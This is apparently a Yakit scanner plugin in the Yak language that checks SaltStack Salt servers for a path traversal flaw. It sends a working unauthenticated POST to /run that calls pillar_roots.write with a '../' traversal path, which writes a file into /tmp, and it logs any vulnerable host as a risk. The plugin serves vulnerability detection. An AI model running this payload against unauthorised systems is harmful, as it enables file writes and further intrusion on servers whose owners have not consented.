yakit.AutoInitYakit()

handleCheck = func(target,port){
    var url
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    level=["","low","middle","high","critical"]
    if isTls {
        url="https://"+addr
    }else{
        url="http://"+addr
    }
    vulnable=false

    reference="saltstack salt 对路径名的限制不恰当（路径遍历）"
    severity="high"
    type="漏洞"
    r1 = str.RandStr(5)

    poc_url_r0= url + `/run`
    req_r0, _ := http.NewRequest("GET",poc_url_r0,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),)
    breq,_=http.dump(req_r0)
    resp_r0, err := http.Do(req_r0)
    die(err)
    bresp,_=http.dump(resp_r0)
    header, body = poc.Split(bresp)
    r0_flag = false
    if resp_r0.StatusCode == 200 && str.Contains(string(header),"application/json") && str.Contains(string(body),"wheel_async") && str.Contains(string(body),"runner_async"){
        r0_flag = true
    }

    poc_url_r1= url + `/run`
    req_r1, _ := http.NewRequest("POST",poc_url_r1,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),
    http.header(`Content-type`,`application/json`),
    http.body(`{"eauth":"auto","client":"wheel_async","fun":"pillar_roots.write","data":"`+ parseStr(r1) +`","path":"../../../../../../../../../tmp/`+ parseStr(r1) +`"}`),)
    breq,_=http.dump(req_r1)
    resp_r1, err := http.Do(req_r1)
    die(err)
    bresp,_=http.dump(resp_r1)
    header, body = poc.Split(bresp)
    r1_flag = false
    if resp_r1.StatusCode == 200 && str.Contains(string(header),"application/json") && re.Match(`salt/wheel/d*`,string(body)){
        r1_flag = true
    }

    poc_url=poc_url_r1
    if r0_flag && r1_flag{
        vulnable = true
    }
    if vulnable {
            yakit.Info("FOUND INFO for %v %v",reference,type)
            risk.NewRisk(
                url, risk.severity(severity), 
                risk.title(sprintf("FOUND %v %v",reference,type)),
                risk.titleVerbose(sprintf("%v %v",reference,type)),
                risk.type(type), risk.typeVerbose(type),
                risk.details({
                    "request": breq,
                    "response": bresp,
                    "url": poc_url,
                }),
            )
        }
    return
}
handle = func(result) {
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
